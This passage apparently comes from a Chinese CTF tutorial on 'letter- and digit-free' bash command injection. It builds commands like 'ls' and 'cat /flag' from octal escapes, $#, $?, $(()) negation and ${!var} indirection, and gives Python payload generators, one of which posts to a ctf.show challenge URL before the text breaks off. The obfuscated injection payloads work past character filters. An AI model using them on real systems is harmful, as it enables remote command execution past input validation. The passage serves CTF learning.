src="/archives/6b3277d2/QQ20241227-210609.png"></p><p>但这有个缺陷，即**<code>$&#39;&#39;</code>中命令是不能接参数的，因为整个字符串被<code>$&#39;&#39;</code>包裹时，它会被当作一个整体字符串来处理，而linux没有<code>ls /</code>的单一命令，所以会报错**</p><p><img src="/archives/6b3277d2/QQ20241227-210926.png"></p><p>那么应该怎么构造呢？</p><p>这里有两个思路，一是<strong>利用重定向<code>&lt;</code>将<code>/flag</code>内容传递给<code>cat</code>执行，再输出他们执行的结果：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#x27;\143\141\164&#x27;&lt;$&#x27;\057\146\154\141\147&#x27;</span><br></pre></td></tr></table></figure><p><img src="/archives/6b3277d2/QQ20241227-211504.png"></p><p>但有个缺陷就是需要知道flag文件名。所以需要另一种方法，<strong>即<code>bash&lt;&lt;&lt;&#123;......&#125;</code>会将大括号里的内容交给bash解析，参数用<code>,</code>隔开，如<code>bash&lt;&lt;&lt;&#123;cat,/f*&#125;</code>、<code>bash&lt;&lt;&lt;&#123;ls,/&#125;</code><strong>，</strong>而bash可以用<code>$0</code>表示</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">0&lt;&lt;&lt;&#123;$<span class="string">&#x27;\154\163&#x27;</span>,$<span class="string">&#x27;\057&#x27;</span>&#125;</span>  </span><br><span class="line">//bash&lt;&lt;&lt;&#123;ls,/&#125;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">0&lt;&lt;&lt;&#123;$<span class="string">&#x27;\143\141\164&#x27;</span>,$<span class="string">&#x27;\057\146\052&#x27;</span>&#125;  //bash&lt;&lt;&lt;&#123;<span class="built_in">cat</span>,/f*&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/archives/6b3277d2/QQ20241227-213119.png"></p><p><strong>如果没有参数则不用大括号，不然会报错</strong></p><p><img src="/archives/6b3277d2/QQ20241227-213256.png"></p><p><strong>当然没有大括号也是能执行命令的</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /f*</span><br><span class="line">$0&lt;&lt;&lt;$&#x27;\143\141\164\40\57\146\52&#x27;</span><br></pre></td></tr></table></figure><p><img src="/archives/6b3277d2/QQ20241227-222627.png"></p><p>通过上面的例子我们发现我们可以在数字可用的情况下进行命令执行</p><p>除此之外，在<strong>linux中<code>$(())</code>用于算术运算，即括号内的内容为进行运算的部分，默认情况下<code>$(())</code>为0</strong></p><p><img src="/archives/6b3277d2/QQ20241227-213735.png"></p><p>这样不就能随便构造数字了嘛，再结合**<code>$&#39;&#39;</code>**来执行RCE，可以发现这样有些多此一举，但如果只能使用1或0来构造命令时它的用处就大了。</p><p>这里还有个知识点，即<strong>bash里面可以使用<code>[bash#]n</code>的方式表示数字，即<code>2#100</code>表示2进制下的100，换成10进制即4</strong></p><p><img src="/archives/6b3277d2/QQ20241227-214745.png"></p><p>现在知识点铺垫完了，直接开整。现在我们字母或数字只有0，1可用来进行命令执行，这时可用位移运算<code>1&lt;&lt;1</code>来代替2，payload:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">0&lt;&lt;&lt;$\&#x27;\\$(($((<span class="number">1</span>&lt;&lt;<span class="number">1</span>))#10011010))\\$(($((<span class="number">1</span>&lt;&lt;<span class="number">1</span>))#10100011))\&#x27;</span>  </span><br><span class="line">//ls</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">0&lt;&lt;&lt;&#123;$\&#x27;\\$(($((<span class="number">1</span>&lt;&lt;<span class="number">1</span>))#10001111))\\$(($((<span class="number">1</span>&lt;&lt;<span class="number">1</span>))#10001101))\\$(($((<span class="number">1</span>&lt;&lt;<span class="number">1</span>))#10100100))\&#x27;,$\&#x27;\\$(($((<span class="number">1</span>&lt;&lt;<span class="number">1</span>))#111001))\\$(($((<span class="number">1</span>&lt;&lt;<span class="number">1</span>))#10010010))\\$(($((<span class="number">1</span>&lt;&lt;<span class="number">1</span>))#10011010))\\$(($((<span class="number">1</span>&lt;&lt;<span class="number">1</span>))#10001101))\\$(($((<span class="number">1</span>&lt;&lt;<span class="number">1</span>))#10010011))\&#x27;&#125;</span></span><br><span class="line">//bash&lt;&lt;&lt;&#123;cat,/flag&#125;</span><br></pre></td></tr></table></figure><p><img src="/archives/6b3277d2/QQ20241227-221018.png"></p><p>但似乎不能用f*匹配了，但<code>ls /</code>都能执行，还怕不知道文件名嘛</p><p>但有一点需要注意的是，bash在执行命令前，会对命令进行一系列扩展（expansions），这些扩展包括花括号扩展（brace expansion）、波浪号扩展（tilde expansion）、<strong>参数和变量扩展</strong>（parameter and variable expansion）、<strong>算术扩展（arithmetic expansion）、命令替换（command substitution）</strong>、单词分割（word splitting）和文件名扩展（filename expansion）等，最重要的是这些扩展的顺序是固定的，而且是从左到右进行的。</p><p>而我们的八进制转义也就是$’\xxx\xxx’依赖于<strong>参数和变量扩展</strong>，转义后的结果是个<strong>字符串</strong>，即使用过一次bash了，由于我们本地就是bash环境，会默认解析，即输入**<code>$&#39;\154\163&#39;</code><strong>会解析执行，而我们带参数的命令还需执行</strong>单词分割扩展**，即<code>$&#39;\143\141\164\40\57\146\154\141\147&#39;</code>时本地bash已经解析为了<code>cat /flag</code>字符串，但无法进行单词分隔扩展，所以会把命令当成一个整体，所以执行后会显示<code>bash: cat /flag: 没有那个文件或目录</code>。所以一般情况下还需要一个bash，即<code>bash&lt;&lt;&lt;$&#39;\143\141\164\40\57\146\154\141\147&#39;</code></p><p>而我们有些时候还需要进行的操作是<strong>算术扩展</strong>和<strong>命令替换</strong>，所以一般除了本地解析外，还需要一个bash，即**<code>bash&lt;&lt;&lt;bash\&lt;\&lt;\&lt;......</code>**，后面会讲到</p><p>具体原理文章参考：<a href="https://www.freebuf.com/articles/system/361101.html">https://www.freebuf.com/articles/system/361101.html</a></p><p>可用看到这种构造方式不够极限，里面不仅出现了0还出现了1，<strong>下面我们开始真正的无字母数字构造</strong></p><h3 id="利用-构造"><a href="#利用-构造" class="headerlink" title="利用$#构造"></a>利用$#构造</h3><p>在shell中，<code>$#</code>表示脚本后所输入的字符串个数：</p><p><img src="/archives/6b3277d2/QQ20241227-221718.png"></p><blockquote><p><strong>$# -参数数量-单独使用结果为0</strong></p><p><strong>$ -计数变量（#）长度，这里的结果为1</strong></p></blockquote><p>这里0和1都有了，那构造命令不就只用换一下嘛</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash"><span class="variable">$#</span>&lt;&lt;&lt;$\&#x27;\\$(($((<span class="variable">$&#123;##&#125;</span>&lt;&lt;<span class="variable">$&#123;##&#125;</span>))#<span class="variable">$&#123;##&#125;</span>$#$#<span class="variable">$&#123;##&#125;</span><span class="variable">$&#123;##&#125;</span>$#<span class="variable">$&#123;##&#125;</span><span class="variable">$#</span>))\\$(($((<span class="variable">$&#123;##&#125;</span>&lt;&lt;<span class="variable">$&#123;##&#125;</span>))#<span class="variable">$&#123;##&#125;</span>$#<span class="variable">$&#123;##&#125;</span><span class="variable">$&#123;##&#125;</span><span class="variable">$&#123;##&#125;</span>$#$#$#<span class="variable">$&#123;##&#125;</span><span class="variable">$&#123;##&#125;</span>))\&#x27;</span> </span><br><span class="line">bash&lt;&lt;&lt;ls</span><br></pre></td></tr></table></figure><p><img src="/archives/6b3277d2/QQ20241227-223822.png"></p><p>测试发现不是这样的，虽然**$0表示bash，$<code>，在linux中</code>${!}&#96;表示间接引用**，举个例子:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.sh:</span><br><span class="line"></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">var1=<span class="string">&quot;11111&quot;</span></span><br><span class="line">var2=<span class="string">&quot;var1&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;!var2&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/archives/6b3277d2/QQ20241227-225012.png"></p><p><img src="/archives/6b3277d2/QQ20241228-035026.png"></p><blockquote><p><strong>可认为${!a}&#x3D;$$a</strong></p></blockquote><p>因此我们只用找到一个值为0的变量来替换即可，而<code>$#</code>值恰好为0,所以**<code>$&#123;!#&#125;</code>就能使用**</p><p><img src="/archives/6b3277d2/QQ20241227-225822.png"></p><p>那么bash有了，<strong>其余的0和1换成<code>$#</code>和<code>$</code>即可</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;!#&#125;&lt;&lt;&lt;$\&#x27;\\$(($((<span class="variable">$&#123;##&#125;</span>&lt;&lt;<span class="variable">$&#123;##&#125;</span>))#<span class="variable">$&#123;##&#125;</span>$#$#<span class="variable">$&#123;##&#125;</span><span class="variable">$&#123;##&#125;</span>$#<span class="variable">$&#123;##&#125;</span><span class="variable">$#</span>))\\$(($((<span class="variable">$&#123;##&#125;</span>&lt;&lt;<span class="variable">$&#123;##&#125;</span>))#<span class="variable">$&#123;##&#125;</span>$#<span class="variable">$&#123;##&#125;</span>$#$#$#<span class="variable">$&#123;##&#125;</span><span class="variable">$&#123;##&#125;</span>))\&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/archives/6b3277d2/QQ20241227-230306.png"></p><p>由于这里只需要进行<strong>参数和变量扩展</strong>和<strong>单词分割</strong>，所以除本地解析外一个bash就够了，两个也不影响：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;!#&#125;&lt;&lt;&lt;<span class="variable">$&#123;!#&#125;</span>\&lt;\&lt;\&lt;\$\&#x27;\\$(($((<span class="variable">$&#123;##&#125;</span>&lt;&lt;<span class="variable">$&#123;##&#125;</span>))#<span class="variable">$&#123;##&#125;</span>$#$#<span class="variable">$&#123;##&#125;</span><span class="variable">$&#123;##&#125;</span>$#<span class="variable">$&#123;##&#125;</span><span class="variable">$#</span>))\\$(($((<span class="variable">$&#123;##&#125;</span>&lt;&lt;<span class="variable">$&#123;##&#125;</span>))#<span class="variable">$&#123;##&#125;</span>$#<span class="variable">$&#123;##&#125;</span>$#$#$#<span class="variable">$&#123;##&#125;</span><span class="variable">$&#123;##&#125;</span>))\&#x27;</span></span><br></pre></td></tr></table></figure><blockquote><p>注意转义，主要使用这种形式</p></blockquote><p><img src="/archives/6b3277d2/QQ20241227-235408.png"></p><p><img src="/archives/6b3277d2/QQ20241227-230730.png"></p><p>但在有些题中有可能**<code>$&#123;!#&#125;</code>这种复杂变量不能通过php的system函数解析出来**，可以换另一种形式，即变量拼接</p><p><img src="/archives/6b3277d2/QQ20241227-231515.png"></p><p>加了$__作为过渡，减少了解析过程</p><p>payload:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__=$#;$&#123;!__&#125;&lt;&lt;&lt;$&#123;!__&#125;\&lt;\&lt;\&lt;\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;))\&#x27;</span><br><span class="line">//bash&lt;&lt;&lt;bash&lt;&lt;&lt;ls</span><br></pre></td></tr></table></figure><p><img src="/archives/6b3277d2/QQ20241227-231702.png"></p><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cmd=<span class="string">&#x27;cat /flag&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;__=$&#123;#&#125;;$&#123;!__&#125;&lt;&lt;&lt;$&#123;!__&#125;\\&lt;\\&lt;\\&lt;\\$\\\&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cmd:</span><br><span class="line">        payload+=<span class="string">f&#x27;\\\\$(($((1&lt;&lt;1))#<span class="subst">&#123;<span class="built_in">bin</span>(<span class="built_in">int</span>(<span class="built_in">oct</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:]))[<span class="number">2</span>:]&#125;</span>))&#x27;</span>.replace(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;$&#123;##&#125;&#x27;</span>).replace(<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;$&#123;#&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload+=<span class="string">&#x27;\\\&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure><h3 id="利用-构造-1"><a href="#利用-构造-1" class="headerlink" title="利用$?构造"></a>利用$?构造</h3><p>其实构造时我们也发现了，只需要找到一个值为0的变量得到bash就能继续构造。而<strong>linux中<code>$?</code>表示最后命令的退出状况，0表示没有错误，其他表示有错</strong>，那么思路就来了，只要payload不报错值不就为0嘛</p><p><img src="/archives/6b3277d2/QQ20241227-232254.png"></p><p>0有了，那1怎么来呢？这里就需要字符串拼接了，<code>__=$?</code>,那<code>++__</code>不就为1了嘛，令<code>___=$((++__))</code>，那2不就也有了嘛，把之前的payload替换一下就好了:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__=$?&amp;&amp;___=$((++__))&amp;&amp;____=$((++___))&amp;&amp;_____=$?&amp;&amp;$&#123;!_____&#125;&lt;&lt;&lt;$\&#x27;\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;))\&#x27;</span><br><span class="line"></span><br><span class="line">//_____=0;____=2;__=1,bash&lt;&lt;&lt;$&#x27;\143\141\164\40\57\146\154\141\147&#x27;,cat /flag</span><br></pre></td></tr></table></figure><p>这里就要注意了，上面那个是执行不了的，因为这里除了<strong>参数和变量扩展</strong>和<strong>单词分割</strong>外，还存在<strong>算术扩展</strong>，所以一个bash是解析不完的，只能解析<strong>参数和变量扩展</strong>和<strong>算术扩展</strong>，而<strong>单词分割</strong>没有bash解析，最后报错<code>bash: cat /flag: 没有那个文件或目录</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__=$&#123;?&#125;&amp;&amp;___=$((++__))&amp;&amp;____=$((++___))&amp;&amp;_____=$&#123;?&#125;&amp;&amp;$&#123;!_____&#125;&lt;&lt;&lt;$&#123;!_____&#125;\&lt;\&lt;\&lt;\$\&#x27;\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;))\&#x27;</span><br></pre></td></tr></table></figure><blockquote><p>这里多了个bash就能执行成功</p></blockquote><p><img src="/archives/6b3277d2/QQ20241227-235810.png"></p><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cmd=<span class="string">&#x27;cat /flag&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;__=$&#123;?&#125;&amp;&amp;___=$((++__))&amp;&amp;____=$((++___))&amp;&amp;_____=$&#123;?&#125;&amp;&amp;$&#123;!_____&#125;&lt;&lt;&lt;$&#123;!_____&#125;\\&lt;\\&lt;\\&lt;\\$\\\&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cmd:</span><br><span class="line">        payload+=<span class="string">f&#x27;\\\\$((2#<span class="subst">&#123;<span class="built_in">bin</span>(<span class="built_in">int</span>(<span class="built_in">oct</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:]))[<span class="number">2</span>:]&#125;</span>))&#x27;</span>.replace(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;$&#123;__&#125;&#x27;</span>).replace(<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;$&#123;____&#125;&#x27;</span>).replace(<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;$&#123;_____&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload+=<span class="string">&#x27;\\\&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure><h3 id="利用-构造-2"><a href="#利用-构造-2" class="headerlink" title="利用$(())构造"></a>利用$(())构造</h3><p>前面我们已经知道<code>$(())</code>用于算术运算，而默认<code>$(())</code>为0，我们尝试取反：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo $((~$(())))</span><br></pre></td></tr></table></figure><p><img src="/archives/6b3277d2/QQ20241228-003415.png"></p><p>那对-2取反呢</p><p><img src="/archives/6b3277d2/QQ20241228-003503.png"></p><p>这里又得到了1，linux中的取反操作时针对二进制进行的，那么现在就可以通过相加减获得数字。</p><blockquote><p>比如对5取反，会将5转换成二进制00000101，再取反为11111010，1表负，反转位加1即00000101表6，即-6</p></blockquote><p>根据上面的payload，我们的目的其实只用得到0，1，2，那思路不就和$?一样嘛，只用<strong>将<code>$?</code>换成<code>$(())</code>即可</strong>，这里同样进行了<strong>算术扩展解析，所以需要两个bash</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__=$(())&amp;&amp;___=$((++__))&amp;&amp;____=$((++___))&amp;&amp;_____=$(())&amp;&amp;$&#123;!_____&#125;&lt;&lt;&lt;$&#123;!_____&#125;\&lt;\&lt;\&lt;\$\&#x27;\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;))\&#x27;</span><br></pre></td></tr></table></figure><p><img src="/archives/6b3277d2/QQ20241228-003914.png"></p><p>说白了，只要能得到0，1，2，无论取反和自增都能得到想要的命令，下面尝试下取反：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0： $(())</span><br><span class="line">-1: $((~$(())))</span><br><span class="line">1:  $((~$((~$(($(())))$((~$(())))))))    </span><br><span class="line">2:  $(($((~$((~$(($(())))$((~$(())))))))&lt;&lt;$((~$((~$(($(())))$((~$(())))))))))     1&lt;&lt;1</span><br><span class="line">2：  $((~$(($((~$(())))$((~$(())))$((~$(())))))))</span><br></pre></td></tr></table></figure><blockquote><p>上面是省略了+号后的式子，0取反为-1，-2取反为1，-3取反为2</p></blockquote><p>所以把上面的式子与之前payload对应的数字换掉即可，由于需要$’\154\163’</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-1：$((~$(())))</span><br><span class="line">1：$((~$((~$(($(())))$((~$(())))))))</span><br><span class="line">3：$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br><span class="line">4: $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br><span class="line">5: $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br><span class="line">6: $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br></pre></td></tr></table></figure><p>即：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash&lt;&lt;&lt;bash\&lt;\&lt;\&lt;\$\&#x27;\\$((~$((~$(($(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$((~$(($(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\&#x27;</span><br></pre></td></tr></table></figure><blockquote><p>注意2个bash</p></blockquote><p><img src="/archives/6b3277d2/QQ20241228-033556.png"></p><p>然后就是利用变量拼接构造bash,payload:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__=$(());$&#123;!__&#125;&lt;&lt;&lt;$&#123;!__&#125;\&lt;\&lt;\&lt;\$\&#x27;\\$((~$((~$(($(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$((~$(($(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\&#x27;</span><br><span class="line">//ls</span><br></pre></td></tr></table></figure><p><img src="/archives/6b3277d2/QQ20241228-034050.png"></p><p><strong>取反脚本</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://15a309e4-9e6d-4a18-8767-7be0a1efdfa9.challenge.ctf.show/&quot;</span></span><br><span class="line">cmd=<span class="string">&#x27;cat /flag&#x27;</span></span><br><span class="line"></span><br><span class="line">r = &#123;&#125;</span><br><span class="line"></span><br><span class="line">x=<span class="string">&#x27;$((~$(())))&#x27;</span><span class="comment">#-1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">        r[i]=<span class="string">&#x27;$((~$((&#x27;</span>+x</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i):</span><br><span class="line">                r[i]+=x</span><br><span class="line">        r[i]+=<span class="string">&#x27;))))&#x27;</span></span><br><span class="line"></span><br><span class="line">r[<span class="number">0</span>]=<span class="string">&#x27;$(())&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;__=$(())&amp;&amp;$&#123;!__&#125;&lt;&lt;&lt;$&#123;!__&#125;\\&lt;\\&lt;\\&lt;\\$\\\&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cmd:</span><br><span class="line">        payload+=<span class="string">&#x27;\\\\&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">oct</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:]:</span><br><span class="line">                payload+=r[<span class="built_in">int</span>(i)]</span><br><span class="line">payload+=<span class="string">&#x27;\\\&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">r=requests.post(url,data=&#123;<span 